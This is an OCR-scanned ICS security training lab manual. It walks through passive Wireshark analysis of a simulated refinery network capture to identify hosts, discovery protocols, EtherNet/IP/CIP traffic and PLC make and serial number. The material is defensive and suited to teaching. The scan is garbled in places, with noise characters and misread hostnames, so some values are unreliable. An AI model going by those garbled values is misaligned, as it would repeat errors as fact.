e Sim 5: Ack Transmission Alarms
e Sim 6: Ack Distribution Residential Alarms
e Sim 7: Ack Distribution Industrial Alarms
e Sim 8: Expert Mode
o O=Off
o 1=On (Run generation with Start / Stop buttons)

Load data:
Industrial load total 300 MW
Refinery A = 120 MW (40% of Total Industrial Load)
Refinery B = 120 MW (40% of Total Industrial Load)
Auxiliary plant load = 60 MW (approximately 20% of Total Industrial Load)

Residential load total 100 MW

Generation information:
Generation total name plate capacity = 280 MW

Operating conditions of note:

Local generation cannot service total industrial and residential load, therefore this system is a net importer
when at full load and the Intertie needs to be closed. If at full load and the Intertie trips, then the system will
trip the generator.

With the Intertie closed, all load can be served from the bulk electric system without any local generation

*Important* The Matrikon service could timeout or hang and may need to be restarted to establish
communications with the HMI. Double click the icon on the desktop to restart the service if the HMI stops
receiving screen updates.

© 2021, Robert M. Lee Lab 2.1 — 12

fe

=

4

Ce

ft
vouvuwveuvewbvbuveweweuweoewe7e

vo vs vw Ww WwW

a’ Ss VS VS |

You will note that the PLC and board continue to function regardless of the HMI runtime, however you will
likely want the runtime up and communicating as you perform later labs where you look at network
communications.

Exercise Takeaways

Understand the operational capabilities available through the HMI, and locally “in the field” through manual
controls on the board. Also, it is important to be aware of how the system works with interdependencies
across power generation, transmission, distribution, and industrial load, as later labs will begin to
“misoperate” the system and knowing what normal operations looks like will help to identify abnormal
operational events.

© 2021, Robert M. Lee Lab 2.1- 13
_Lab 2.2 - ICS Traffic Analysis

yy

Objectives

e Identify the Enterprise and Control devices through IT Discovery protocols and communications

*Scenario Information* In the context of the scenario, we have a baseline capture from the Calistoga Refinery.
As a security team we need to analyze the capture to determine any identifying information on assets which
will help us understand their context and roles.

This lab will be using the RELICS VM. On the Desktop of the VM, there is a folder identified as C5515. Inside,
there is the calistogarefinery folder and then pcaps folder which contains the packet capture
normalops.pcap that will be used during this lab.

Questions

1. How many unique (not broadcast or multicast) Ethernet assets are
on the network?

2. How many unique (not broadcast or multicast) IPv4 assets are
on the network?
3. What are the most useful IT “discovery” protocols for asset information present in this pcap?

4. What are the IP addresses and (if available) what are the host names of the Enterprise (L4/L5) assets?

© 2021, Robert M. Lee Lab 2.2-1
5. What are the IP addresses and (if available) what are the hose names of the OT (L3 and below) assets?
6. What ICS vendor makes the PLC?
© 2021, Robert M. Lee Lab 2.2-2

,

ee ee ee ee ee |
DP Dw Ww wD DP DP Ww Ww

wa

Task — Identify the Ethernet Addresses, IP Addresses, and ICS Protocols in small_baseline.pcap

1. How many unique (not broadcast or multicast) Ethernet assets are
on the network? 16

> Start your RELICS VM
> Login tothe VM

> LOGIN =relics
> PASSWORD = relics

> Open normalops.pcap in Wireshark
> Open the ICS515 folder located on the Desktop and then navigate to calistogarefinery > pcaps
> Double click on normalops.pcap to open the file in Wireshark

Gat Home Desktop

ICS515

calistogarefinery peaps + Q 8 =. = Qo x

® Recent

wo Ww

wp

incident.pca 196.4MB 2348 + &
%& Starred peap °
Gt Home  normalops.pcap 37.1MB 2339 ok
© Desktop “NN

Documents

Th recneethae

wy

wp

*Note* Once the capture loads, what you are seeing on the screen is the network traffic from the capture,
including the time it was seen by the Network Interface Card (NIC), the Source, Destination, Protocol, Length,
and accompanying Info.

> — Identify the unique endpoints in the traffic
> At the top of the Wireshark panel, click Statistics

ue © Ww © Ww Ww

> Click on Endpoints

Analyze

Telephony Wireless Tools Help
Capture File Properties Ctrl+Alt+Shift+c
Resolved Addresses

Protocol Hierarchy

Conversations

Endpoints

Packet Lengths

1/O Graph

Service Response Time r

RUIeN INAATO chatinting

© 2021, Robert M. Lee Lab 2.2-3
*Note* The Endpoints option lets you view the unique logical addresses in the network capture at the various
layers, including the Ethernet address, IP address, and TCP or UDP ports

> Record the number of unique Ethernet addresses
*Note* Wireshark automatically identifies the Organizationally Unique Identifier (OUI), which takes up the

first 3 bytes of the Ethernet (or MAC) address. E.g. SiemensN_0d:3d:3f. You can disable this by unchecking the
Name resolution box in the bottom left corner. When recording the unique Ethernet addresses, do not include

multicast and broadcast addresses. Also, you can sort them by clicking the “Address” column.

Ethernet-27 IPv4-23 IPv6-18 TCP-11  UDP-62

Address * Packets Bytes  TxPackets  TxBytes Rx Packets Rx Bytes
-Rockwell_5a:72:ce 177,969 26M 89,666 13M 88,303
Rockwell_da:32:12 50,471 6,883k 25,441 3,612 k 25,030
Rockwell_fa:a9:45 29,882 3,336k 14,798 1,678 k 15,084
Rockwell_c5:c5:f2 20 1,200 20 1,200 0
| RealtekS_12:03:b5 14 10k 14 10k )
IPv4mcast_16 10 600 0 i) 10
IPv4mcast_fb 4 400 0 0 -
IPv4mcast_fc 8 602 0 0 8
IPv6mcast_Oc 14 10k 0 is] 14
IPv6mcast_16 10 900 0 0 10
IPv6mcast_Fb 4 480 i) 0 4
IPv6mcast_01:00:02 244 37k 0 0 244
IPv6mcast_01:00:03 12 1,126 it) 0 12
IPv6mcast_ff:3c:b1:88 2 172 0 0 2
IPv6mcast_ff:96:88:9b 2 172 0 ie) 2
Pegatron_8d:59:1e 80 18k 80 18k )
Pegatron_8d:59:1F 16 1,360 16 1,360 0
Dell_3c:53:04 48 6,292 48 6,292 fs)
Dell_3c:53:05 28 4,498 28 4,498 is)
Dell_3c:53:06 28 4,498 28 4,498 0
Dell_3c:53:07 29 4,651 29 4,651 0
Dell_3¢:53:08 39 5,691 39 5,691 0
Dell_3c:53:09 110 11k 82 8,830 28
Dell_3c:53:0a 89,758 10M 44,506 5,045k 45,252
Dell_3c:53:0b 108,874 19M 54,146 9,244k 54,728
Dell_3c:53:0c 30 5,122 30 5,122 it)
Broadcast___ 236 3tkK 8H
v e resolution Limit to display Filter

*Answer* There are 16 unique Ethernet addresses. This does not mean there are 16 physical devices like
computers but instead 16 network interface cards seen (some devices can have multiple interface cards).

© 2021, Robert M. Lee

Lab 2.2-—4

ynrents#sksfhk_Fsethesehfs fs ® @,

®)
y

2. How many unique (not broadcast or multicast) IPv4 assets are
on the network? 16

> Identify the unique IPv4 endpoints in the traffic
> At the top of the Wireshark panel, click Statistics
> Click on Endpoints
> Click the IPv4 tab

Ethernet - 27 IPv4 - 23 | IPv6 - 18 TcP- 11 UDP - 62

‘Address _—s* Packets Bytes TxPackets Tx Bytes _Rx Pack
0.0.0.0 36 12k 36 12k
10.10.0.10 8 988 8 988

/10.10.0.20 2 520 2 520

| 10.10.0.30 2 520 2 520
10.10.0.40 2 520 2 520
10.10.0.50 4 1,028 4 1,028

10.10.1010 79 «7,234 52 4,472
10.10.10.20 59,848 6,681k 29,680 3,363 k
10.10.10.30 108,869 19M 54,143 9,244k
10.10.10.40 2 530 2 530

| 10.10.20.10 176,303 26M 88,725 13M
10.10.20.20 29,882 3,336k 14,798 1,678k

| 10.10.20.40 29,882 3,336k 14,798 1,678 k
10.10.20.50 51,923 7,053k 26,170 3,700 k

| 10.10.255.255 88 11k 0 0

| 10.20.20.10 97 12k 97 12k
10.20.40.10 97 12k 97 12k

169.254.201.178 8 575 8 575

| 169.254.223.26 8 575 8 575

| 224.0.0.22 10 600 0 0

| 224.0.0.251 4 400 0 0

| 224,0.0.252 8 602 0 0

| 255.255.255.255 102 17k 0 0

*Answer* There are 16 unique IPv4 addresses. 0.0.0.0 is actually technically an address but the 169.254’s are
addresses for when you cannot connect to DHCP though it’s been configured for it. The addresses ending in
255 and starting with 224 are multicast and broadcast addresses.

© 2021, Robert M. Lee Lab2.2-5
3. What are the most useful IT “discovery” protocols for asset information present in this pcap?

ARP.
MDNS
LLMNR
DHCP
DHCPv6
NetBIOS

> Identify the most useful IT discovery protocols by searching Protocol Hierarchy

> Atthe top of

the Wireshark panel, click Statistics

> Click on Protocol Hierarchy

Protocol

Analyze , Statistics Telephony Tools
(2) Summary
Comments Summary

Show address resolution
eee Protocol Hierarchy
{© Conversations
: Endpoints
4 Packet Lengths...
* ta (0 Graph

Internals

« Percent Packets
100.0

~ Frame
v Ethernet

© 2021, Robert M. Lee

internet Protocol Version 6
~ User Datagram Protocol
Multicast Domain Name System
Link-local Multicast Name Resolution
DHCPv6é
Data
Internet Control Message Protocol v6
Internet Protocol Version 4
» User Datagram Protocol
NetBIOS Name Service
» NetBIOS Datagram Service
~ SMB (Server Message Block Protocol)
~ SMB MailSlot Protocol
Microsoft Windows Browser Protocol
Multicast Domain Name System
Link-local Multicast Name Resolution
EtherNet/IP (industrial Protocol)
Dynamic Host Configuration Protocol
Data
~ Transmission Control Protocol
~ EtherNet/IP (Industrial Protocol)
» Common Industrial Protocol
» CIP Connection Manager
Malformed Packet
CIP Class Generic
Internet Group Management Protocol
Internet Control Message Protocol
Address Resolution Protocol

100.0

0.1
0.1
0.0
0.0
0.1
0.0
0.0
99.9
0.1
0.0
0.0

Packets F
228971
228971

232

166489

115645
10

3

31

Lab 2.2-6

oH ®e OH H ®H HH HH *S * O@

nmennneenmh ® mm ® eo ® ® WW
<g! Uw Tu

i)

ov wow Ww W®

*Note* We see a variety of discovery protocols, but we cannot be sure they are all useful yet. We'll have to
validate each. What we see so far though is ARP, MDNS, LLMNR, DHCPv6, NetBIOS, DHCP, and IGMP.

> Validate traffic from each discovery protocol to identify which have core information
> Inthe Protocol Hierarchy view right click > Apply as Filter > Selected each

Protocol
~ Frame
~ Ethernet
~ Internet Protocol Version 6
gram Protocol

>

Muliicast Das oS So
Apply as Filter

~ User Datagram
NetBIOS Nai
~ NetBIOS Da

Inspect each of the discovery protocols to determine which have meaningful content

Prepare a Filter

Copy as CSV
Copy as YAML

~ Percent Packets

Selected

Not Selected
..and Selected

100.0
100.0

...or Selected
...and not Selected
...or not Selected

*Note* There is no need to inspect ARP, it is inherently useful to tie MAC to IPs

{W]mdns| uns Gz: =
No. Time __ Source Destination Protocol Length Info
92126 861.991080 169.254.223.26 224.0.6.251 MDNS 81 Standard query @x90@0 ANY DESKTOP-HGA4MU6. local,
+> 92127 861.991080 fe80::d92:7d9b:1b72.. FfO2::fb MDNS 101 Standard query ©x9000 ANY DESKTOP-HGA4MU6. local,
92130 801.997596 169.254.223.26 224.08.8.251 MDNS. 119 Standard query response 0x9800 AAAA fe8O::d92:7¢

*Note* MDNS shows the DESKTOP-HGAMU6 name which is useful for 169.254.223.26

(]itimar

No. Time Source Destination Protocol Length info
57615 522.552773  fe80::30a8:4300:f13.. FfO2::1:3 LLMNR 94 Standard query ©x89de A ENTERPRISES
57616 522.552773 18.10.0.10 224.0.0.252 LLMNR 71 Standard query Ox89de A ENTERPRISES
57620 522.554370 fe80: :30a8:4300:f13.. FF02::1:3 LLMNR 91 Standard query Oxb32b AAAA ENTERPRISES
57623 522.560369 fe80: :30a8:4300:f13.. FfO2::1:3 LLMNR 91 Standard query Oxce35 A ENTERPRISES
$7624 522.560369 109.10.96.10 224.0.0,.252 LLMNR 71 Standard query ©xce35 A ENTERPRISES
57625 522.560369 fe80: :30a8:4300:f13.. FfO2::1:3 LLMNR 91 Standard query @x0594 AAAA ENTERPRISES

*Note* LLMNR shows numerous IP’s hostnames such as 10.10.0.10 being ENTERPRISES

© 2021, Robert M. Lee

Lab2.2-7
Protocol |

No. Time “source ; Destination
| 1:356a:8135:c6a9:b939

1236 37.094066 fe80: :bc76:3047:d6ec:4697 DHCPVv6
2002 53.789764 fe80: :3deb:3fec:7d46:58d4 DHCPVv6
2013 54.799543 fese: :3deb: 3fec: 7d46: 58d4 DHCPVv6

wavs 08a. = N bit: Server should perform DNS updates”
ae = 0 bit: Server has not overridden client's S bit preference
= § bit: Server should not perform forward DNS updates
Client aan ENTERPRISE2
~ Vendor Class
Option: Vendor Class (16)
Length: 14
Value: 9000013700084d53465420352e30
Enterprise ID: Microsoft (311)
vendor-class-data: MSFT 5.0
>» Option Request

*Note* We aren’t going to focus on IPv6 for simplicity purposes but this protocol is still valuable and shows
that this IPv6 address is ENTERPRISE2 and is a MSFT 5.0 system which means Windows 2000 servers and up.

(i{nbas
No. “Time ____ Source Destination Protocol “Length. “Info
19929 222.865909 16.10.10.30 10.10.255.255 NBNS. 92 Name query NB ‘ENTERPRISES<20>
- 20732 229.001874 10.10.10.10 10.10.255.255 NBNS. 92 Name query NB VIEW-DESIGNER<ic>
20789 229.752095 10.10.10.10 10.10.255.255 NBNS. 92 Name query NB VIEW-DESIGNER<ic>
20920 230.502282 10.10.10.10 10.10.255.255 NBNS 92 Name query NB VIEW-DESIGNER<ic>
ORAM ONT KOATIA 49 49 19 410 40 10 988 98K Nene 09 Nama mary WR \V/TEWRECTANEDSA nS

*Note* NetBIOS’s Name Server (NBNS) is of great value and shows 10.10.10.30 as ENTERPRISES as an example

© 2021, Robert M. Lee Lab 2.2-8
Protocol
30952 309.350648 *
: 31589 314.187004 10.10.0.50 10.10.255.255 BROWSEF
' 32431 320.738881 10.10.0.40 10.19.255.255 BROWSEF
' 37275 358.821316 10.10.10.30 10.10.255.255 BROWSEF
| 43550 408.442007 10.10.10.40 10.10.255.255 BROWSEF
Size: 67. : ; ;

Mailslot Name: \MAILSLOT\BROWSE
~ Microsoft Windows Browser Protocol
Command: Host Announcement (0x01)
Update Count: 0
Update Periodicity: 12 minutes
Host Name: ENTERPRISES
Windows version: Windows 7 or Windows Server 2008 R2
OS Major Version: 6
OS Minor Version: 1
Server Type: ©0x00011083, Workstation, Server,
Browser Protocol Major Version: 15
Browser Protocol Minor Version: 1
Signature: 0xaa55
Host Comment: Enterprise User 3

NT Workstation, Potential Brq

*Note* NetBIOS Datagram service shows some host names like ENTERPRISE3 and FACTORY-TALK-HI and
through SMB shares that the Windows version is 7 or Windows Server 2008 R2 with various information about
the OS.

ee 1ce see nee

Hi]dhcp

No Time Source Destination
Sa2de aer: 6.0.0.9
33615 330.309693 0.0.0.0 255.255.255.255
34067 333.431945 0.0.0.0 255.255.255.255
34954 340.676044 0.0.0.0 2550\255)..295 (255.
36933 356.164078 0.0.0.0 255.255.255.255
40992 388.141472 6.6.8.6 255 1.255.295.2990
41386 391.263943 0.0.0.0 255.255: 255.255
42287 398.508612 0.0.0.0 255.255.255.255
AADANE AAD OOF os es =

Magic cookie: DHCP
» Option: (53) DHCP Message Type (Discover)
» Option: (61) Client identifier
~ Option: (12) Host Name
Length: 15

Host Name: DESKTOP-HGA4MU6

» Antinan: (fA) Vendor class identifier

*Note* DHCP shows that the odd 0.0.0.0 address is the Pegatron device and communicates itself as DESKTOP-
HGA4MU6 device.

© 2021, Robert M. Lee Lab 2.2-9
Sligmp

No. ss Time_—- ____ Source 2 see lone ____ Protocol Length
92119 801.978987 169.254 .223.26 224.0.0.22 IGMPv3—s«éGE
92121 801.989751 169.254.223.26 224.0.0.22 IGMPv3 66
92123 801.989751 169.254,223.26 224.0.0.22 IGMPv3 66
92125 801.989751 169.254.223.26 224.0.0.22 IGMPv3 66
A440 GAN MRATINT AaQN AEA 199 NE ANA A A AN TOME? er

*Note* There is nothing really of value here in IGMP.

*Answer* Therefore ARP, MDNS, LLMNR, DHCPv6, NetBIOS, and DHCP are all useful IT discovery protocols.

4. What are the IP addresses and (if available) what are the host names of the Enterprise (L4/L5) assets?

10.10.0.10 — ENTERPRISE1
10.10.0.20 — ENTERPRISE2
10.10.0.30 — ENTERPRISES
10.10.0.40 — ENTERPRISE4
10.10.0.50 — ENTERPRISES

> Leverage the IT discovery protocols to identify devices that have Enterprise host names
> Use the protocols we just reviewed to record names and |Pv4 addresses

(®) (@) o@ eo

(W]nbns Es si eh i an ee mabe sath

No. Time Source Destination Protocol Length Info _
35353 343.503232 10.10.10.10 10.10.255.255 NBNS 92 Name query NB VIEW-DESIGNER<ic>
35422 344.253044 10.10.10.10 10.10.255.255 NBNS 92 Name query NB VIEW-DESIGNER<1ic>
36116 349.911127 10.10.10.10 10.10.255.255 NBNS 92 Name query NB SF.SYMCD.COM<00>
36253 350.661736 10.10.10.10 10.10.255.255 NBNS 92 Name query NB SF.SYMCD.COM<00>
36317 351. 412008 10.10.160.10 10.10.255.255 NBNS 92 Name query NB SF.SYMCD.COM<00>
36429 352.212488 10.10.10.10 10.10.255.255 NBNS 92 Name query NB SF.SYMCB.COM<00>
36511 352.962364 10.10.10.10 10.10.255.255 NBNS 92 Name query NB SF.SYMCB.COM<00>
36617 353.712945 10.10.10.10 16.10.255.255 NBNS 92 Name query NB SF.SYMCB.COM<00>

92 Name ENTERPRISES <20>

$7621 $22.555765 48 .10.9.10 16. 10.255.255

*Note* If you see something duplicative (i.e. two different IPs broadcasting that they are a specific hostname,

leveraging the other discovery protocols as well as looking at traffic patterns such as if the device is
communicating on ICS protocols or not can help deduplicate those issues

> Leverage the IPv4 addressing in combination with the hostnames
> The IPv4 addressing follows a pattern that becomes obvious with the hostnames

© 2021, Robert M. Lee Lab 2.2-10

eo fF ® © &® & Oh ww

om

or fF @ @

@

@,
py Bp

i

we w Ww Dp Ww

ow

we ww

wo w Ww

oe ww ww

ww Ww

)

c

‘

Ethernet-27 | IPv4-23 | IPve

‘Address 7 Packets Byt
0.0.0.0 36

| 10.10.0.10 8
-10.10.0.20 2
10.10.0.30 2
10.10.0.40 2

) 10.10.0.50 4
10.10.10.10 79
10.10.10.20 59,848 6,

*Answer* The Enterprise assets are all addressed 10.10.0.X which would include
10.10.0.10 — ENTERPRISE1
10.10.0.20 — ENTERPRISE2
10.10.0.30 — ENTERPRISE3
10.10.0.40 — ENTERPRISE4
10.10.0.50 — ENTERPRISES

*Note* ENTERPRISES shows up on a couple of different Ips and it is the NetBIOS Datagram Service that helps
identify the .50 IP address as the actual ENTERPRISES

5. What are the IP addresses and (if available) what are the hose names of the OT (L3 and below) assets?

10.10.10.10 — VIEW-DESIGNER (View Designer)

10.10.10.20 — FACTORY-TALK-VI (Factory Talk View)

10.10.10.30 - ENG_WORKSTATION (Studio 5000 Logix Designer)
10.10.10.40 — FACTORY-TALK-HI (Factory Talk Historian)
10.10.20.10

10.10.20.20

10.10.20.40

10.10.20.50

10.20.20.10

10.20.40.10

> Leverage the IT discovery protocols to identify devices that have non-Enterprise host names
> Follow the same process as the previous question eliminating the known Enterprise Ips

Source Destination Protocol Length Info
20920 230 .502282 10.10.10.10 10.10.255.255 NBNS 92 Name query NB VIEW-DESIGNER<1ic>
28160 287.594735 19.18.10-10 10.10. 255. 255 NBNS 92 Name query NB VIEW-DESIGNER<ic>
28285 288. 345950 10.10.10.10 10.10.255.255 NBNS 92 Name query NB VIEW-DESIGNER<ic>

© 2021, Robert M. Lee Lab 2.2-11
3 SS ee
49550 408442007". 10.10.10..40 19.19.255.255 BROWSER. 265 Host Announcement FACTORY-TALK-HI, '
= 1319.. 1126.231278 10.10.10.40 10.10. 255.255 BROWSER 265 Host Announcement FACTORY-TALK-HT,

Windows version: Windows 7 or Windows Server 2008 RZ
OS Major Version: 6
OS Minor Version: 1
» Server Type: 0x@0011003, Workstation, Server, NT Workstation, Potential Browser
Browser Protocol Major Version: 15
Browser Protocol Minor Version: 1
Signature: @xaa55

Host Comment: Factory Talk Historian

> Leverage Conversations to identify who is communicating on ICS ports
> View Statistics > Conversations
> Navigate to the TCP tab
© Operator systems communicate to ICS ports on controllers

Telephony Wireless Tools Help
Capture File Properties Ctrl+Alt+Shift+c
Resolved Addresses

Protocol Hierarchy

Conversations
Endpoints
Packet Lengths

Pac

3,336 k
10.10.10.20 54741 10.10.20.50 44818 29,882 3,336k
| 10.10.20.10 44818 10.10.10.30 1511 25,051 5,621k
| 10.10.20.10 44818 10.10.10.30 1746 61,683 10M
10.10.20.20 54741 10.10.20.10 44818 29,827 3,330k
/10.10.20.20 54741 10.20.20.10 44818 55 6,084
| 10.10.20.40 54741 10.10.20.10 44818 29,827 3,330k
10.10.20.40 54741 10.20.40.10 44818 55 6,084
!10.10.20.50 44818 10.10.10.30 1746 20,589 3,546k
10.10.20.50 44818 10.10.10.30 1336 1,230 129k
/10.10.20.50 44818 10.10.10.30 2157 222 40k
10.20.20.10 44818 10.10.10.30 1746 42 6,813
/10.20.40.10 44818 10.10.10.30 1746 42 6,813

© 2021, Robert M. Lee Lab 2.2 -12

»@mememneneen#enrn mf”, * mm ™

™m a

aD
‘Ww aw

wo ww ww we Ww | Ww Ww WH WH Ww we Ww Ww wa DB we WD Ww ww

*Note* Port 44818 is an ICS port for EtherNet/IP and would be on the controller. Therefore we can tell that
10.10.10.20 is an operator system (e.g. HMI or EWS) communicating to 10.10.20.10 as a controller (e.g. PLC).

Assets with EtherNet/IP:

10.10.20.10
10.10.20.50
10.20.20.10
10.20.40.10

*Note* Identifying the systems communicating to the ICS ports can help identify the operator stations as an
example 10.10.10.30 is communicating to 10.10.20.10 on 44818.

*Note* The non-Enterprise systems follow the IP schema of 10.10.10.x for L3 (operator stations) and
10.10.20.x and 10.20.x.x for L2 (controllers).

*Answer* The L3 and L2 assets are:

10.10.10.10 — VIEW-DESIGNER (View Designer)
10.10.10.20 — FACTORY-TALK-VI (Factory Talk View)
10.10.10.30 - ENG_WORKSTATION (Studio 5000 Logix Designer)
10.10.10.40 — FACTORY-TALK-HI (Factory Talk Historian)
10.10.20.10

10.10.20.20

10.10.20.40

10.10.20.50

10.20.20.10

10.20.40.10

6. What ICS vendor makes the PLC? Rockwell
> Filter on any of the controller IP addresses
> Filter for ip.addr==10.10.20.10

o The PLCs are all made by the same vendor
> Determine the vendor from the Ethernet address

© 2021, Robert M. Lee Lab 2.2 -13
(W[ipaddr=210.10.20.10_

| Packet list ~| | Narrow & Wide » |_| Case sensitive | String
Newsies sal IM Ooo OUR ea = Destination
| 90162 786.067827 10.10.20.10 10.10.10.30
| 90163 786 .076708 10.10-20-10 10.10.10.30
| 90165 786.079781 10.10.20.10 10.10.10.30
OnATA Whe annonce AM AN AM AM AN AN AN 9M

» Frame 90163: 591 bytes on wire (4728 bits), 591 bytes captured (4)
~ Ethernet II, Src: Rockwell_5a:72:ce (00:00:bc:5a:72:ce), Dst: Del:
> Destination: Dell_3c:53:0b (f8:db:88:3c:53:0b)

Source: Rockwell 5a:72:ce (00:00:be:5a:72:ce)
Type: IPv4 (@x0800)

*Answer* Rockwell

Identifying assets and understanding how the network looks, how it is connected, and what assets
communicate with each other is the first step to accomplishing security. Defense tools and processes are
extremely limited when you do not understand what you are trying to defend. Identifying assets and
visualizing a network can seem daunting when viewed in the context of the entire network.

© 2021, Robert M. Lee Lab 2.2-14

ov 8

a ee ee eee ee

=»

a > > > mh oH HD ® ®

——
iw

ae Ww Ww Ww Ww Jw |S Ww YS WD WD Ww WD W

_ Lab 2.3 - ICS Protocol Analysis

Objectives s

e = Identify additional information about the controllers leveraging the ICS protocol(s)

*Scenario Information* In the context of the scenario, we have a baseline capture from the Calistoga Refinery.
As a security team we need to analyze the capture to determine any identifying information on assets which
will help us understand their context and roles. At this point we are examining the normal communications of
the ICS protocols to extract additional asset information.

Exercise Prep

This lab will be using the RELICS VM. On the Desktop of the VM, there is a folder identified as /CS515. Inside,
there is the calistogarefinery folder and then pcaps folder which contains the packet capture
normalops.pcap that will be used during this lab.

1. What ICS Protocol is present in the capture?

2. What protocol is running in some of the sessions with CIP?

3. What is the make, model, and serial number of the PLC at 10.10.20.10?

4. What type of safety function/system is 10.10.20.50 part of?

5. What are a few of the tags viewable in 10.10.20.50’s communications?

6. How many words is the Request Path Size for TimerDelay with 10.10.20.50 as the Destination?

© 2021, Robert M. Lee Lab 2.3-1
Task — Identify the Ethernet Addresses, IP Addresses, and ICS Protocols in small_baseline.pcap

1. What ICS Protocol is present in the capture? EtherNet/IP CIP

> Start your RELICS VM
> Log into the VM
> LOGIN =relics
> PASSWORD = relics

> Open normalops.pcap in Wireshark

> Open the ICS515 folder located on the Desktop and then navigate to calistogarefinery > pcaps
> Double click on normalops.pcap to open the file in Wireshark

Gt Home Desktop 1CS515 calistogarefinery pcaps + Oe 2 = = o x

x Modified Star
> Recent :

* incident.pca 196.4MB 2348 otk
%& Starred a ms °
() Home normalops.pcap 37.1MB 23:39 oe
(1 Desktop eee

(=) Documents

Te ee Ws

> Identify the unique protocols in the traffic
> At the top of the Wireshark panel, click Statistics
> Click on Protocol Hierarchy
> Identify the ICS protocols

Analyze Telephony _Wireless Tools Help _
Capture File Properties Ctrl+Alt+Shift+c

Resolved Addresses

Protocol Hierarchy

Conversations

Endpoints

Packet Lengths

1/O Graph

Service Response Time |

10.10. 2(

© 2021, Robert M. Lee Lab 2.3-2

aw @®) (@) (®)

Rneneemnemnmenenemnn#en#nn*nh)n *f» *) * * ®
aw a

wy

wy

wy

‘By ‘Be iB’ 4B’ ip’

<B’

} Protocols sss ais suai sitet ___* Percent Packets _— Packets
: ied Frame 100.0 228971
) ~ Ethernet 100.0 228971
~ Internet Protocol Version 6 0.1 288
L » User Datagram Protocol 0.1 274
’ Multicast Domain Name System 0.0 4
) Link-local Multicast Name Resolution 0.0 12
) DHCPVv6 0.1 244
b) Data 0.0 14
2 Internet Control Message Protocol v6 0.0 14
3 » Internet Protocol Version 4 $9.9 228632
a » User Datagram Protocol 0.1 232
1 NetBIOS Name Service 0.0 29
~ NetBIOS Datagram Service 0.0 21
g ~ SMB (Server Message Block Protocol) 0.0 21
~ SMB MailSlot Protocol 0.0 21
Microsoft Windows Browser Protocol 0.0 21
Multicast Domain Name System 0.0 4
) Link-local Multicast Name Resolution 0.0 8
q EtherNet/IP (Industrial Protocol) 0.0 52
Dynamic Host Configuration Protocol 0.0 36
Data 0.0 82
» Transmission Control Protocol 99.7 228387
4 ~ EtherNet/IP (industrial Protocol) 72.7 166521
~ Common Industrial Protocol Ted 166489
~ CIP Connection Manager 0.9 2079
MalFormed Packet 0.0 16
CIP Class Generic 50.5 115645
Internet Group Management Protocol 0.0 10
Internet Control Message Protocol 0.0 3
Address Resolution Protocol 0.0 51

*Answer* The ICS protocol that is immediately obvious is EtherNet/IP CIP

2. What protocol is running in some of the sessions with CIP? PCCC

*Note* Continue from the last step

*Note* There will be protocols that Wireshark does not dissect, however in this case we are just looking to see
if there’s another protocol in use embedded in CIP. There are a number of ways to identify the protocol but
the easiest place to start is looking for anything that looks out of place

> Filter by the Malformed Packet
> In Protocol Hierarchy select the Malformed Packet
> Apply as Filter > Selected
> Analyze the communications looking for anything that sticks out

© 2021, Robert M. Lee Lab 2.3-3
Data —yar- Bz
» Transmission Control Protocol 99.7 22838
~ EtherNet/IP (Industrial Protocol) ay a & 166521

~ Common industrial Protocol 72.7 166489

~ CIP Connection Manager
Malformed Packet

Apply as Filter Selected

Not Selected
...and Selected

—o

Destination Protocol

1312 .946233 19.10.10,39 CIP PCCC
| 1588... 1336 .887681 16.10.20.10 10.10.10.30 CIP PCCC 102
1626... 1360.821953 19.10.20.10 16.16.10.30 cIP Pccc 102

. 1396.709656 10.10.20.10 10.10.10.30 CIP PCCCc
4g 19 20 10° 1p 19 19 20 pp

CIP PCCC Object
» Service: Unknown Service (0x52) (Response)

~ [Expert Info (Error/Malformed) : Malformed Packet (Exception occurred) ]
[Malformed Packet (Exception occurred) ]

[Severity level: Error]

[Group: Malformed]

*Answer* PCCC is a protocol that leverages CIP and is often associated with Rockwell PLCs which makes sense

in our environment.
3. What is the make, model, and serial number of the PLC at 10.10.20.10?

Rockwell Automation / Allen-Bradley

1756-L55/A and 1756-M12/A LOGIX5555

0x0019c114
> Filter for the PLC’s IP address
> Enter the filter ip.addr==10.10.20.10

(WJip.addr==10.10.20.10 a
No. _Time SOUECR = 5 5 i Destination _ Protocol _ Length | Info. x -
| "857. 1312.928917 ~ 10.10.20.40 10.10.20.10 cIP 116 ‘DP7Running’ - Service (@x4

1557... 1312.934433 10.19.20.10 10.10.20.40 cIP 107 Success: 'DP7Running' - Ser

1557... 1312.934729 _10.10.20.40 10.10.20.10 cIP 114 'pp7Start' - Service (@x4c)

. 1312.935881 10.10.20.10 10.18.10.30 TCP 60 44818 ~ 1746 [ACK] Seq=8718

. 1312.940368  10.10.20.10 10.10.20.40 cIP 107 Success: 'DP7Start' - Servi

. 1312.940618 10.10.20.40 10,.10.20.10 cIP 114 'DP7Time' - Service (@x4c)
© 2021, Robert M. Lee Lab 2.3-4

eo « & &

eo)

nnn em mh) mm ™
0 ee ee ee ee ee

@me@ne®

nmomm
(py ‘ey ip (eg ig’ ‘sg! ts) (a

ip

‘se

J

ws AS ws ww ws Se es’ s

*Note* We can see that the 10.10.20.10 IP address is communicating to a couple of IP addresses including .40
and .30 over CIP. There’s numerous ways to find the communications even just by quickly checking the “Info”
block. Since this is a fairly clean capture we can scroll to the top and start there.

> Scroll to the top of Wireshark and identify any Identity or Attributes functions

4 0.005754 10.10.10.20 10.18.20.10 ENIP 82 Register Session (Req), Sessio
5 0.007637 ENIP 82 Register Session (Rsp), Session:
ENIP 78 List Identity (Req)

é q 310. 129 List Identity (R5p),-1756-ENBT/A
8 8.010802 10.16.10. 26 10.16.20.10 CIP CM 114 Unconnected Send: Identity - Get Attributes All
9 8.617643 16.10.26.10 10.16.16.20 cIP ‘Swng, 144 Success: Identity - Get Attributes All

*Note* We see there is both a List Identity (request and response) and Identity — Get Attributes All command
leveraged. These are great to review and identify if any information is relevant. The List Identity even notes in
the info that the device is a 1756-ENBT/A. The most valuable will be the Get Attributes which will
communicate everything known about the device.

9 0.817643 144 Success: Identity - Get Attributes Ail

10 0.017940 46 Connection Manage! arge Forward Open (Message Router)

11 6.920693 ‘ 3 if 98 Service not supported: Connection Manager - Large Forward Op
12 8.828992 -18.10. 19.18.20.10 CIP cM 142 Connection Manager - Forward Open (Message Router)

13 8.630459 10.19.28.10 19.18.16.20 cIP cM 124 Success: Connection Manager - Forward Open

14 6.030683 10.19.16. 20 10.19.20.10 cIP 412 Class (8x64) - Get Attribute List

15 9.034686 10,19.28.10 10.19.10.20 cIP 143 Success: Class (@x64) - Get Attribute List

Vendor ID: Rock ion/Allen-Bradley (0x0901)
+ Attribute: 2 = 2)

